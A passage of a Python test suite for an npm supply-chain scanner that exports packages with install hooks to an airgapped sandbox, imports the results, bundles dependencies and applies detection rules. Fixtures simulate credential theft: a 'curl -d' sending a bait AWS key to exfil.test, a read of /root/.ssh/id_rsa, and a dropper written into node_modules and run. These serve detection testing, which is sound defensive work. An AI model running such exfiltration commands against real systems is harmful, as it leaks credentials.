    (world.run_dir(EARLIER) / "correlate.jsonl").write_text("not a candidate\n")
    world.add_run([])
    assert world.stage().refreshed == ()


# --- replay ---------------------------------------------------------------------------------------


@pytest.mark.usefixtures("untouchable")
def test_replay_never_imports_or_exports_and_ignores_later_results(world: World) -> None:
    world.add_run([Version("kx")])
    # A live call's record, made without the guard: pending.
    info = {
        "cap": 30,
        "answers": {Version("kx").key(): {"state": "pending", "result_sha256": None}},
    }
    (world.run_dir() / SANDBOX_INFO).write_text(json.dumps(info))
    cached = world.data.root / CACHE_DIR / Version("kx").key()
    cached.mkdir(parents=True)  # a result that arrived later: replay must not use it
    (cached / RESULT_FILE).write_bytes(result("kx"))
    (out,) = world.stage(replay=True).candidates
    assert not_run_reason(out) == PENDING


@pytest.mark.usefixtures("untouchable")
def test_replay_of_a_run_never_rendered_reads_as_unconfigured(world: World) -> None:
    world.add_run([Version("kx")])
    (out,) = world.stage(replay=True).candidates
    assert not_run_reason(out) == NOT_CONFIGURED


def test_replay_of_an_accepted_result_whose_cache_is_gone(world: World) -> None:
    world.add_run([Version("kx")])
    world.stage()
    world.answer()
    world.stage()
    cached = world.data.root / CACHE_DIR / Version("kx").key()
    (cached / IMPORT_FILE).unlink()
    (out,) = world.stage(replay=True).candidates
    assert not_run_reason(out) == f"{CACHE_UNREADABLE} (cache: the recorded result is missing)"


def test_recorded_answers_ignore_malformed_entries(world: World) -> None:
    run_dir = world.run_dir()
    run_dir.mkdir(parents=True)
    key = "a" * 64
    answers = {
        key: {"state": "accepted", "result_sha256": "b" * 64},
        "b" * 64: {"state": "made-up"},
        "c" * 64: {"state": "rejected", "reason": 5},
        "d" * 64: "pending",
        "not a key": {"state": "pending"},
    }
    (run_dir / SANDBOX_INFO).write_text(json.dumps({"answers": answers, "cap": True}))
    assert recorded_answers(run_dir) == {key: stage.Answer("accepted", "b" * 64)}
    assert stage.recorded_cap(run_dir) is None
    (run_dir / SANDBOX_INFO).write_text(json.dumps({"answers": []}))
    assert recorded_answers(run_dir) == {}
    (run_dir / SANDBOX_INFO).write_text("[]")
    assert recorded_answers(run_dir) == {}


# --- wiring -------------------------------------------------------------------------------------


def test_the_real_rules_are_the_default(world: World, monkeypatch: pytest.MonkeyPatch) -> None:
    calls: list[str] = []

    def fake_apply(
        candidate: Candidate,
        run: SandboxRun,
        observations: Sequence[Observation],
        *,
        shipped: frozenset[str] | None = None,
        bundled_deps: frozenset[str] | None = None,
    ) -> tuple[Finding, ...]:
        assert bundled_deps is None  # not a bundle
        calls.append(f"{candidate.change.new.ref.name} {sorted(shipped or ())}")
        return ()

    monkeypatch.setattr(stage, "apply_rules", fake_apply)
    world.add_run([Version("kx")])
    world.stage(rules=None)
    world.answer()
    world.stage(rules=None)
    assert calls == ["kx ['package.json']"]
    assert world.info()["rules"] == rules_fingerprint(
        [*REAL_RULES, NOT_RUN, RESULT_REJECTED, INSTALL_FAILED, BUNDLED, BUNDLE_INCOMPLETE]
    )


def test_sandbox_json_counts_and_fingerprint(world: World) -> None:
    world.add_run([Version("kx"), Version("none", body=tarball("none", {}))])
    world.stage()
    info = world.info()
    assert info["stage_version"] == stage.STAGE_VERSION
    assert info["rules"] == rules_fingerprint(
        [*RULES, NOT_RUN, RESULT_REJECTED, INSTALL_FAILED, BUNDLED, BUNDLE_INCOMPLETE]
    )
    assert info["bundles"] == {}  # neither needs dependencies
    assert info["counts"] == {
        "reported": 2,
        "selected": 1,
        "analysed": 0,
        "install_failed": 0,
        "infra_error": 0,
        "rejected": 0,
        "pending": 1,
        "deferred": 0,
        "not_run": 0,
        "bundled": 0,
        "unbundled": 0,
        "bundle_pending": 0,
        "tarball_pending": 0,
    }
    assert info["tarballs"] == {}


def test_a_pending_run_without_results_is_not_rendered_again(world: World) -> None:
    world.add_run([Version("kx")], run_id=EARLIER, as_of=AS_OF - timedelta(hours=1))
    world.stage(EARLIER)
    before = world.output(EARLIER)
    world.add_run([])
    staged = world.stage()
    assert staged.refreshed == ()
    assert staged.imported == {Version("kx").key(): "absent"}
    assert world.output(EARLIER) == before


def test_the_real_rules_run_over_an_imported_result(world: World) -> None:
    """Integration: the default rules accept what the importer produces (no fake rule)."""
    world.add_run([Version("kx")])
    world.stage(rules=None)
    world.answer(
        Files=[{"Path": "/root/.ssh/id_rsa", "Read": True, "Write": False, "Delete": False}],
        Sockets=[{"Address": "192.0.2.10", "Port": 443, "Hostnames": ["exfil.test"]}],
    )
    (out,) = world.stage(rules=None).candidates
    ids = stage5_ids(out)
    assert ids and all(i.startswith("sandbox.") for i in ids)
    assert out.history[-1].reason.startswith("analysed (completed)")
    output = world.output()
    world.stage(rules=None, replay=True)
    assert world.output() == output


def test_an_earlier_rejection_refreshes_only_when_the_file_changes(world: World) -> None:
    world.add_run([Version("kx")], run_id=EARLIER, as_of=AS_OF - timedelta(hours=1))
    world.stage(EARLIER)
    (job,) = world.jobs(EARLIER)
    path = world.results / job["key"] / "1.0.0.json"
    path.parent.mkdir(parents=True)
    path.write_bytes(b"{}")
    world.stage(EARLIER)  # imports it: rejected
    world.add_run([])
    assert world.stage().refreshed == ()  # same bytes: the same rejection
    path.write_bytes(result("kx"))
    assert world.stage().refreshed == (EARLIER,)
    (out,) = [Candidate.model_validate_json(x) for x in world.output(EARLIER).splitlines()]
    assert stage5_ids(out) == ["test.observed"]


# --- network mode, install name, failed installs, oversize results ------------------------------


def test_every_job_is_airgapped_and_there_is_no_network_choice(world: World) -> None:
    """The owner's decision: package-analysis runs on an airgapped VM. Every exported job
    carries -fully-offline -nopull -offline, `sandbox.json` says "airgapped", and the stage
    takes no network argument at all."""
    world.add_run([Version("kx")])
    world.stage()
    (job,) = world.jobs()
    assert job["network"] == "airgapped"
    assert {"-fully-offline", "-nopull", "-offline"} <= set(job["args"])
    assert job["command"].endswith("-nopull -offline")
    assert world.info()["network"] == "airgapped"
    with pytest.raises(TypeError):
        run_sandbox_stage(world.data, RUN_ID, results=world.results, network="online")  # type: ignore[call-arg]


def test_a_failed_install_is_reported_not_quiet(world: World) -> None:
    """Offline, npm install of a tarball with registry dependencies fails before any hook."""
    world.add_run([Version("kx")])
    world.stage()
    world.answer(Status="error_analysis")
    (out,) = world.stage().candidates
    assert stage5_ids(out) == ["test.observed", INSTALL_FAILED.id]
    failed = next(f for f in out.findings if f.rule_id == INSTALL_FAILED.id)
    assert "airgapped" in failed.explanation
    assert out.history[-1].reason.startswith("analysed (failed)")
    info = world.info()
    assert info["counts"]["install_failed"] == 1 and info["counts"]["analysed"] == 1


def test_a_result_too_large_is_rejected_at_high(
    world: World, monkeypatch: pytest.MonkeyPatch
) -> None:
    from kitsunox.sandbox import results as results_module

    world.add_run([Version("kx")])
    world.stage()
    world.answer()
    monkeypatch.setattr(results_module, "MAX_RESULT_BYTES", 10)
    (out,) = world.stage().candidates
    rejected = next(f for f in out.findings if f.rule_id == RESULT_REJECTED.id)
    assert (rejected.severity, rejected.weight) == (Severity.HIGH, 5.0)
    assert rejected.evidence[0].snippet == RESULT_TOO_LARGE
    output = world.output()
    world.stage(replay=True)
    assert world.output() == output


def test_the_tarballs_own_name_is_the_package_analysis_imports(world: World) -> None:
    """Manifest confusion: the registry says `kx`, the tarball's package.json says `helper`.
    npm installs it as `helper`, so that is -package (and what the result records)."""
    body = make_tar_gz(
        [
            TarEntry(
                "package/package.json",
                json.dumps({"name": "helper", "version": "1.0.0", **HOOKED}).encode(),
            )
        ]
    )
    world.add_run([Version("kx", body=body)])
    world.stage()
    (job,) = world.jobs()
    assert (job["name"], job["install_name"]) == ("kx", "helper")
    assert job["args"][job["args"].index("-package") + 1] == "helper"
    assert job["key"] == Version("kx", body=body).key()
    world.answer()
    (out,) = world.stage().candidates
    assert stage5_ids(out) == ["test.observed"]


def test_the_driver_baits_are_masked_through_the_stage(world: World) -> None:
    """End to end: the baits come from package-analysis's driver command for this job."""
    key_id = "AKIAIEXAMPLEBAITXXXQ"
    world.add_run([Version("kx")])
    world.stage(rules=None)
    key = Version("kx").key()
    job = exported_jobs(world.data, RUN_ID)[0]
    assert job.key == key
    secret = "aW5lcnQtdGVzdC1iYWl0LXZhbHVlLTMwLWJ5dGUh"  # noqa: S105 (an inert fake bait)
    driver = {
        "Command": list(driver_argv(job, "install")),
        "Environment": [f"AWS_ACCESS_KEY_ID={key_id}", f"AWS_SECRET_ACCESS_KEY={secret}"],
    }
    curl = {"Command": ["curl", "-d", key_id, "https://exfil.test"], "Environment": None}
    world.answer(Commands=[driver, curl])
    (out,) = world.stage(rules=None).candidates
    rendered = out.model_dump_json()
    assert key_id not in rendered
    assert "sandbox.bait-exfil" in stage5_ids(out)


# --- the tarball's file list ---------------------------------------------------------------------

LISTED = make_tar_gz(
    [
        TarEntry(
            "package/package.json",
            json.dumps({"name": "kx", "version": "1.0.0", **HOOKED}).encode(),
        ),
        TarEntry("package/x.js", b"// inert"),
        TarEntry("package/bin/tool", b"inert"),
    ]
)


def test_the_rules_get_the_tarballs_file_list_live_and_on_replay(world: World) -> None:
    """Round-4 review: the stage never passed the file list, so `sandbox.download-exec`'s
    "not in the tarball" check never ran in the pipeline. It is read from the tarball in the
    blob store on every rendering, replay included."""
    world.add_run([Version("kx", body=LISTED)])
    rules = (ShippedRule(),)
    world.stage(rules=rules)
    world.answer()
    (out,) = world.stage(rules=rules).candidates
    shipped = next(f for f in out.findings if f.rule_id == "test.shipped")
    assert shipped.explanation == "bin/tool,package.json,x.js"
    output = world.output()
    world.stage(rules=rules, replay=True)
    assert world.output() == output


def test_a_dropper_in_its_own_directory_is_seen_through_the_stage(world: World) -> None:
    """End to end with the real rules: a hook writes a file into the package's own directory
    that the tarball doesn't have, then runs it. Through the stage this used to score only
    `sandbox.network` (review: "own-dir dropper: score 3 through the stage")."""
    world.add_run([Version("kx", body=LISTED)])
    world.stage(rules=None)
    payload = "/app/node_modules/kx/payload"
    world.answer(
        Files=[{"Path": payload, "Read": False, "Write": True, "Delete": False}],
        Commands=[{"Command": [payload], "Environment": ["HOME=/root"]}],
    )
    (out,) = world.stage(rules=None).candidates
    assert "sandbox.download-exec" in stage5_ids(out)
    ran = next(f for f in out.findings if f.rule_id == "sandbox.ran")
    assert "Tarball file list: 3 paths." in ran.explanation


def test_overdue_needs_the_current_runs_manifest(world: World) -> None:
    assert stage.overdue_jobs(world.data, "absent", ["absent"], timedelta(0)) == {}


# --- offline dependency bundles -------------------------------------------------------------------

DEP_URL = "https://registry.npmjs.org/dep/-/dep-1.0.0.tgz"
DEP_TARBALL = make_tar_gz(
    [
        TarEntry("package/package.json", b'{"name": "dep", "version": "1.0.0"}'),
        TarEntry("package/index.js", b"module.exports = 1;\n"),
    ]
)
NEEDS_DEP = {**HOOKED, "dependencies": {"dep": "^1.0.0"}}


def dep_registry(router: Router, *, name: str = "dep") -> None:
    """A mock registry holding one inert dependency, published well before the run."""
    tarball_url = f"https://registry.npmjs.org/{name}/-/{name}-1.0.0.tgz"
    body = (
        DEP_TARBALL
        if name == "dep"
        else make_tar_gz(
            [
                TarEntry(
                    "package/package.json", json.dumps({"name": name, "version": "1.0.0"}).encode()
                )
            ]
        )
    )
    router.add_bytes(tarball_url, body)
    router.add_json(
        packument_url(name),
        {
            "name": name,
            "dist-tags": {"latest": "1.0.0"},
            "versions": {
                "1.0.0": {
                    "name": name,
                    "version": "1.0.0",
                    "dist": {"tarball": tarball_url, "integrity": sri_sha512(body)},
                }
            },
            "time": {"1.0.0": "2026-10-01T00:00:00Z"},
        },
    )


def with_deps(name: str, deps: dict[str, str] | None = None, weight: float = 8.0) -> Version:
    packed = {**HOOKED, "dependencies": deps} if deps is not None else NEEDS_DEP
    return Version(name, weight=weight, body=tarball(name, packed))


class BundleRule(ObservedRule):
    """Fake rule: one INFO finding naming the file list and bundled names the stage passed."""

    id: ClassVar[str] = "test.bundle"

    def evaluate(
        self,
        candidate: Candidate,
        run: SandboxRun,
        observations: Sequence[Observation],
        *,
        shipped: frozenset[str] | None = None,
        bundled_deps: frozenset[str] | None = None,
    ) -> Sequence[Finding]:
        listed = "none" if shipped is None else ",".join(sorted(shipped))
        deps = "none" if bundled_deps is None else ",".join(sorted(bundled_deps))
        return (
            Finding(
                rule_id=self.id,
                rule_version=self.version,
                severity=Severity.INFO,
                weight=0.0,
                title="bundle",
                explanation=f"{listed} | {deps}",
            ),
        )


def staged(world: World, router: Router, run_id: str = RUN_ID, **kwargs: Any) -> SandboxStageResult:
    return run_sandbox_stage(
        world.data,
        run_id,
        results=kwargs.pop("results", world.results),
        rules=kwargs.pop("rules", RULES),
        client=router.client(),
        **kwargs,
    )


def finding(c: Candidate, rule_id: str) -> Finding:
    (found,) = [f for f in c.findings if f.rule_id == rule_id]
    return found


def test_a_version_with_dependencies_is_exported_as_a_complete_bundle(
    world: World, router: Router
) -> None:
    dep_registry(router)
    world.add_run([with_deps("kx")])
    (out,) = staged(world, router).candidates
    assert not_run_reason(out) == PENDING
    bundled = finding(out, BUNDLED.id)
    assert "Kitsunox-built offline bundle" in bundled.explanation
    assert "1 dependencies" in bundled.explanation and "top level: dep" in bundled.explanation
    (job,) = world.jobs()
    assert job["bundle"]["dependencies"] == ["dep"] and job["unbundled_reason"] is None
    assert job["bundle_record"] == f"{job['key']}.bundle.json"
    assert job["bundle"]["original_sha256"] == sha256_hex(with_deps("kx").bytes)
    directory = export_dir(world.data, RUN_ID)
    data = (directory / job["file"]).read_bytes()
    assert sha256_hex(data) == job["sha256"]
    tree = extract_tar_gz(data, strip_components=1)
    assert tree.files["node_modules/dep/index.js"] == b"module.exports = 1;\n"
    assert json.loads(tree.files["package.json"])["bundleDependencies"] == ["dep"]
    record = BundleRecord.load_json((directory / job["bundle_record"]).read_bytes())
    assert record.status == "complete" and set(record.files) == set(tree.files)
    assert str(world.data.root) not in (directory / JOBS_FILE).read_text()
    (exported,) = exported_jobs(world.data, RUN_ID)
    assert (
        exported.key == job["key"] == job_key(exported.tarball_sha256, "kx", bundle=exported.bundle)
    )
    info = world.info()
    assert info["bundles"] == {"npm:kx@1.0.0": {"state": "bundled", "reason": None, "missing": []}}
    assert info["counts"]["bundled"] == 1
    snapshot = Snapshot.load(world.run_dir() / SANDBOX_SNAPSHOT)
    assert {e.url for e in snapshot.entries.values()} == {packument_url("dep"), DEP_URL}


def test_a_bundled_result_is_imported_analysed_with_the_bundle_and_replayed(
    world: World, router: Router
) -> None:
    """The importer accepts the result for the bundled job (same package and version), the
    rules get the bundle's file list and the names it added, and replay rebuilds the bundle
    from the run's snapshot without the network."""
    dep_registry(router)
    world.add_run([with_deps("kx")])
    rules = (BundleRule(),)
    staged(world, router, rules=rules)
    assert world.answer() == 1
    (out,) = staged(world, router, rules=rules).candidates
    assert finding(out, "test.bundle").explanation == (
        "node_modules/dep/index.js,node_modules/dep/package.json,package.json | dep"
    )
    assert finding(out, BUNDLED.id).severity == Severity.INFO
    output, info = world.output(), world.info()
    requests = len(router.requests)
    router.offline.update(router.routes)  # replay never fetches
    world.stage(rules=rules, replay=True)
    assert world.output() == output and world.info() == info
    assert len(router.requests) == requests


def test_replay_requires_the_recorded_bundle(world: World, router: Router) -> None:
    dep_registry(router)
    world.add_run([with_deps("kx")])
    staged(world, router)
    world.answer()
    staged(world, router)
    (world.run_dir() / SANDBOX_SNAPSHOT).unlink()
    (out,) = world.stage(replay=True).candidates
    assert not_run_reason(out) == BUNDLE_UNREPRODUCIBLE


def test_an_incomplete_bundle_exports_the_registry_tarball_and_says_why(
    world: World, router: Router
) -> None:
    dep_registry(router)
    version = with_deps("kx", {"dep": "^1.0.0", "gitdep": "git+https://example.test/x.git"})
    world.add_run([version])
    (out,) = staged(world, router).candidates
    assert not_run_reason(out) == PENDING
    incomplete = finding(out, BUNDLE_INCOMPLETE.id)
    assert "will most likely fail" in incomplete.explanation
    assert "gitdep@git+https://example.test/x.git" in incomplete.explanation
    assert incomplete.evidence[0].snippet == "incomplete: unresolved-required"
    (job,) = world.jobs()
    assert job["bundle"] is None and job["unbundled_reason"] == "incomplete: unresolved-required"
    assert job["key"] == version.key() and job["sha256"] == sha256_hex(version.bytes)
    assert world.info()["bundles"]["npm:kx@1.0.0"]["state"] == "unbundled"
    output = world.output()
    world.stage(replay=True)
    assert world.output() == output


def test_a_network_failure_leaves_the_bundle_pending_and_it_is_retried(
    world: World, router: Router
) -> None:
    """Decision 0009: a transient failure is never a missing package. Nothing is exported,
    the version reads pending, and a later live call bundles it."""
    dep_registry(router)
    router.offline.add(packument_url("dep"))
    world.add_run([with_deps("kx")], run_id=EARLIER, as_of=AS_OF - timedelta(hours=1))
    (out,) = staged(world, router, EARLIER).candidates
    assert not_run_reason(out) == BUNDLE_PENDING
    assert world.jobs(EARLIER) == []
    info = world.info(EARLIER)
    assert info["counts"]["bundle_pending"] == 1 and info["counts"]["pending"] == 1
    assert "npm:kx@1.0.0" not in info["keys"]
    output = world.output(EARLIER)
    world.stage(EARLIER, replay=True)  # reproduced from sandbox.json, nothing fetched
    assert world.output(EARLIER) == output
    router.offline.clear()
    world.add_run([])
    assert staged(world, router).refreshed == (EARLIER,)
    (job,) = world.jobs(EARLIER)
    assert job["bundle"]["dependencies"] == ["dep"]
    assert world.info(EARLIER)["bundles"]["npm:kx@1.0.0"]["state"] == "bundled"


def test_after_a_network_failure_the_call_stops_bundling(world: World, router: Router) -> None:
    dep_registry(router)
    dep_registry(router, name="other")
    router.offline.add(packument_url("dep"))
    world.add_run([with_deps("a", weight=9.0), with_deps("b", {"other": "1.0.0"}, weight=8.0)])
    out = by_name(staged(world, router).candidates)
    assert not_run_reason(out["a"]) == not_run_reason(out["b"]) == BUNDLE_PENDING
    assert packument_url("other") not in router.requests


def test_the_download_budget_defers_bundles_in_score_order(world: World, router: Router) -> None:
    dep_registry(router)
    dep_registry(router, name="other")
    world.add_run([with_deps("low", {"other": "1.0.0"}, weight=3.0), with_deps("high")])
    out = by_name(staged(world, router, bundle_budget=1).candidates)
    assert not_run_reason(out["high"]) == PENDING  # first in score order: bundled
    assert not_run_reason(out["low"]) == BUNDLE_BUDGET
    assert [j["name"] for j in world.jobs()] == ["high"]


def test_without_a_results_root_nothing_is_fetched(world: World, router: Router) -> None:
    dep_registry(router)
    world.add_run([with_deps("kx")])
    (out,) = staged(world, router, results=None).candidates
    assert not_run_reason(out) == NOT_CONFIGURED
    assert router.requests == [] and world.jobs() == []
    assert not (world.run_dir() / SANDBOX_SNAPSHOT).exists()


def test_a_refresh_reuses_the_exported_bundle(world: World, router: Router) -> None:
    """A result on its way is for the exported key: rendering the run again never rebuilds a
    bundle it already exported (the registry may have moved on, or Kitsunox changed)."""
    dep_registry(router)
    world.add_run([with_deps("kx")], run_id=EARLIER, as_of=AS_OF - timedelta(hours=1))
    staged(world, router, EARLIER)
    (job,) = world.jobs(EARLIER)
    world.answer(EARLIER)
    router.routes.clear()  # the registry is gone: a rebuild would fail
    world.add_run([])
    rules = (BundleRule(),)
    assert staged(world, router, rules=rules).refreshed == (EARLIER,)
    (out,) = [Candidate.model_validate_json(x) for x in world.output(EARLIER).splitlines()]
    assert world.info(EARLIER)["keys"]["npm:kx@1.0.0"] == job["key"]
    assert finding(out, "test.bundle").explanation.endswith("| dep")
    assert "node_modules/dep/index.js" in finding(out, "test.bundle").explanation


def test_an_original_that_cannot_be_repacked_is_exported_unbundled(
    world: World, router: Router
) -> None:
    dep_registry(router)
    body = make_tar_gz(
        [
            TarEntry("package/package.json", json.dumps({"name": "kx", **NEEDS_DEP}).encode()),
            TarEntry("other/x.js", b"1"),
        ]
    )
    world.add_run([Version("kx", body=body)])
    (out,) = staged(world, router).candidates
    reason = "original-not-repackable: top-level-prefix"
    assert finding(out, BUNDLE_INCOMPLETE.id).evidence[0].snippet == reason
    (job,) = world.jobs()
    assert job["unbundled_reason"] == reason and job["bundle"] is None
    assert router.requests == []


def test_an_unexpected_bundle_error_exports_unbundled_and_never_stops_the_stage(
    world: World, router: Router, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A bug on one package's input (a pydantic ValidationError, a RecursionError) reads as a
    fixed `internal-error`, never the exception's text, and the other versions go on."""
    dep_registry(router)
    first, second = with_deps("kx", weight=9.0), with_deps("ky", weight=8.0)
    world.add_run([first, second])
    real = bundle_module.make_bundle

    def flaky(original: bytes, **kwargs: Any) -> Any:
        if b'"kx"' in gzip.decompress(original):
            raise ValueError("package text: <script>")
        return real(original, **kwargs)

    monkeypatch.setattr(stage, "make_bundle", flaky)
    kx, ky = staged(world, router).candidates
    assert finding(kx, BUNDLE_INCOMPLETE.id).evidence[0].snippet == "internal-error"
    assert finding(ky, BUNDLED.id)
    jobs = {job["name"]: job for job in world.jobs()}
    assert jobs["kx"]["unbundled_reason"] == "internal-error"
    assert jobs["ky"]["bundle"] is not None
    output = world.output()
    world.stage(replay=True)  # reproduced from the recorded state, not rebuilt
    assert world.output() == output


def test_a_refresh_reuses_pending_and_unbundled_exports_as_they_are(
    world: World, router: Router
) -> None:
    dep_registry(router)
    dep_registry(router, name="other")
    gitdep = {"other": "1.0.0", "gitdep": "github:someone/x"}
    versions = [
        with_deps("a", weight=9.0),
        with_deps("b", {"other": "1.0.0"}),
        with_deps("c", gitdep),
    ]
    world.add_run(versions, run_id=EARLIER, as_of=AS_OF - timedelta(hours=1))
    staged(world, router, EARLIER)
    jobs = {j["name"]: j for j in world.jobs(EARLIER)}
    before = (world.info(EARLIER)["keys"], world.info(EARLIER)["bundles"])
    directory = world.results / jobs["a"]["key"]
    directory.mkdir(parents=True)
    (directory / "1.0.0.json").write_bytes(result("a"))
    router.routes.clear()
    requests = len(router.requests)
    world.add_run([])
    assert staged(world, router).refreshed == (EARLIER,)
    assert len(router.requests) == requests  # nothing rebuilt
    assert (world.info(EARLIER)["keys"], world.info(EARLIER)["bundles"]) == before
    out = by_name([Candidate.model_validate_json(x) for x in world.output(EARLIER).splitlines()])
    assert stage5_ids(out["a"]) == [BUNDLED.id, "test.observed"]
    assert not_run_reason(out["b"]) == PENDING and BUNDLED.id in stage5_ids(out["b"])
    assert "gitdep@github:someone/x" in finding(out["c"], BUNDLE_INCOMPLETE.id).explanation
    assert len(world.jobs(EARLIER)) == 3


def test_a_definite_fetch_error_exports_the_registry_tarball(world: World, router: Router) -> None:
    router.add_json(packument_url("dep"), {"error": "forbidden"}, status=403)
    world.add_run([with_deps("kx")])
    (out,) = staged(world, router).candidates
    assert finding(out, BUNDLE_INCOMPLETE.id).evidence[0].snippet == "fetch-error"
    assert world.jobs()[0]["unbundled_reason"] == "fetch-error"


def test_a_run_without_a_manifest_is_exported_unbundled(world: World, router: Router) -> None:
    dep_registry(router)
    world.add_run([with_deps("kx")], manifest=False)
    staged(world, router)
    assert world.jobs()[0]["unbundled_reason"] == "run-manifest-unreadable"
    assert router.requests == []


def test_without_a_results_root_a_bundle_is_rebuilt_from_the_runs_snapshot(
    world: World, router: Router
) -> None:
    dep_registry(router)
    world.add_run([with_deps("kx")])
    staged(world, router)
    (job,) = world.jobs()
    requests = len(router.requests)
    (out,) = staged(world, router, results=None).candidates
    assert not_run_reason(out) == NOT_CONFIGURED and BUNDLED.id in stage5_ids(out)
    assert world.info()["keys"] == {"npm:kx@1.0.0": job["key"]}
    assert len(router.requests) == requests


def test_replay_reproduces_a_recorded_unavailable_bundle(world: World, router: Router) -> None:
    dep_registry(router)
    world.add_run([with_deps("kx")])
    staged(world, router, results=None)
    assert world.info()["bundles"]["npm:kx@1.0.0"] == {
        "state": "unavailable",
        "reason": NOT_CONFIGURED,
        "missing": [],
    }
    output = world.output()
    world.stage(replay=True)
    assert world.output() == output


def test_recorded_bundles_ignores_malformed_entries(world: World) -> None:
    run_dir = world.run_dir()
    run_dir.mkdir(parents=True)
    (run_dir / SANDBOX_INFO).write_text(
        json.dumps(
            {
                "bundles": {
                    "npm:a@1": {"state": "pending", "reason": BUNDLE_BUDGET},
                    "npm:b@1": {"state": "exploded"},
                    "npm:c@1": {"state": "unbundled", "reason": 3},
                    "npm:d@1": {"state": "unbundled", "missing": [1]},
                    "npm:e@1": "pending",
                },
                "keys": {"npm:a@1": "x", "npm:b@1": "0" * 64},
            }
        )
    )
    assert stage.recorded_bundles(run_dir) == {
        "npm:a@1": stage.RecordedBundle("pending", BUNDLE_BUDGET)
    }
    assert stage.recorded_keys(run_dir) == {"npm:b@1": "0" * 64}
    assert stage.stale(world.data, RUN_ID)
    (run_dir / SANDBOX_INFO).write_text(json.dumps({"bundles": [], "keys": []}))
    assert stage.recorded_bundles(run_dir) == {} and stage.recorded_keys(run_dir) == {}


# --- wiring: collect's summary line and retention ----------------------------------------------


def test_the_summary_line_says_what_was_exported_and_imported(world: World) -> None:
    world.add_run([Version("kx"), Version("ky", weight=4.0)])
    first = run_sandbox(world.data, RUN_ID, world.results, None, cap=1)
    assert first.startswith("2 of 2 reported versions have install hooks (1 over the cap of 1)")
    assert "0 analysed (0 install failed), 1 awaiting analysis, 0 results rejected" in first
    assert f"export: 1 jobs in {export_dir(world.data, RUN_ID)}" in first
    world.answer()
    second = run_sandbox(world.data, RUN_ID, world.results, None, cap=1)
    assert "1 analysed" in second and "imported 1 results (0 rejected)" in second
    report = json.loads((world.run_dir() / "report" / "report.json").read_text())
    assert report["sandbox"]["counts"]["analysed"] == 1  # the report is rebuilt after Stage 5
    replayed = run_sandbox(world.data, RUN_ID, None, None, cap=1, replay=True)
    assert "1 analysed" in replayed and "export:" not in replayed


def test_retention_drops_pruned_runs_exports_and_unused_results(world: World) -> None:
    world.add_run([Version("kx")])
    world.add_run([Version("ky")], run_id="later", as_of=AS_OF + timedelta(hours=1))
    world.stage()
    world.stage("later")
    world.answer()
    world.answer("later")
    world.stage("later")
    assert prune_sandbox(world.data) == (0, 0)
    (world.run_dir() / "retention.json").write_text("{}")
    # A pruned run's results stay while the package is pinned (OSV-labelled); its export goes.
    assert prune_sandbox(world.data, {"kx"}) == (1, 0)
    assert not export_dir(world.data, RUN_ID).exists()
    assert prune_sandbox(world.data) == (0, 1)
    assert not (world.data.root / CACHE_DIR / Version("kx").key()).exists()
    assert (world.data.root / CACHE_DIR / Version("ky").key()).is_dir()
    assert export_dir(world.data, "later").is_dir()


def test_a_long_unresolved_spec_is_cut_in_the_finding() -> None:
    long, short = "v" * 100_000, "^1.0.0"
    unresolved = (
        UnresolvedSpec(name="a", spec=long, requirer="", type="prod", optional=False, reason="x"),
        UnresolvedSpec(name="b", spec=short, requirer="", type="prod", optional=False, reason="x"),
        UnresolvedSpec(
            name="c", spec=short, requirer="", type="optional", optional=True, reason="x"
        ),
    )
    assert stage._missing(unresolved) == (f"a@{'v' * stage.MAX_SPEC_SHOWN}...", "b@^1.0.0")
